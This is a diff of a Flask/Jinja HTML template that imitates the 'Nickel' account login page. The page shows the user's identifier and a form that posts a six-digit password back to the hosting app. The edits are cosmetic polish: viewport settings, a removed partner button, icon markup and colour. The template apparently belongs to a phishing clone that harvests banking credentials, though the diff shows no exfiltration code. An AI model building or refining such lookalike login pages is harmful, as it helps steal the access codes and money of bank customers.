@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Nickel – Code</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link rel="stylesheet" href="{{ url_for('static', filename='css/code.css') }}">
 </head>
 <body>
@@ -12,21 +12,19 @@
         <img src="{{ url_for('static', filename='images/nickel-logo.svg') }}" alt="Nickel" class="logo-nk">
         <span class="brand-text">Nickel</span>
     </div>
-    <button class="btn-partner">Espace partenaire</button>
+    <!-- Bouton partenaire supprimé ici -->
 </header>
 <main>
     <div class="center-nk">
         <h1>Connexion à votre espace</h1>
         <div class="idshow-nk">
-            <div class="icon-user-nk">
-                <span>&#128100;</span>
-            </div>
+            <span class="icon-user-nk">👤</span>
             <span class="identifiant-nk">{{ identifiant }}</span>
             <span class="refresh-nk">&#10227;</span>
             <a href="#" class="change-nk">Changer</a>
         </div>
         <form method="POST" autocomplete="off">
-            <label class="label-nk" for="code">Mot de passe (6 chiffres) <span style="color:#ff6600;">*</span></label>
+            <label class="label-nk" for="code">Mot de passe (6 chiffres) <span style="color:#fd8900;">*</span></label>
             <div class="code-input-wrapper">
                 <div class="dot"></div>
                 <div class="dot"></div>
@@ -66,7 +64,6 @@
     <span>|</span>
     <a href="#" class="footer-link-nk">Pas encore client ?</a>
 </footer>
-
 <script>
 const input = document.getElementById('code');
 const dots = document.querySelectorAll('.dot');
